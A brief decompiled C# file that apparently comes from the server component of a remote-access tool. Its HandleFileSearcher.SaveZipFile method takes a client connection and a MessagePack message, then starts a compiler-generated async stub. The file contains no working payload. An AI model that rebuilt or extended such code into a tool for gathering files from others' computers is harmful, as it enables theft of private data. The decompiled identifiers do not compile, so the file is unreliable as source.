using System;
using System.Runtime.CompilerServices;
using Server.Connection;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x02000076 RID: 118
	public class HandleFileSearcher
	{
		// Token: 0x06000413 RID: 1043 RVA: 0x00026584 File Offset: 0x00024784
		public void SaveZipFile(Clients client, MsgPack unpack_msgpack)
		{
			HandleFileSearcher.<SaveZipFile>d__0 <SaveZipFile>d__;
			<SaveZipFile>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<SaveZipFile>d__.client = client;
			<SaveZipFile>d__.unpack_msgpack = unpack_msgpack;
			<SaveZipFile>d__.<>1__state = -1;
			<SaveZipFile>d__.<>t__builder.Start<HandleFileSearcher.<SaveZipFile>d__0>(ref <SaveZipFile>d__);
		}
	}
}
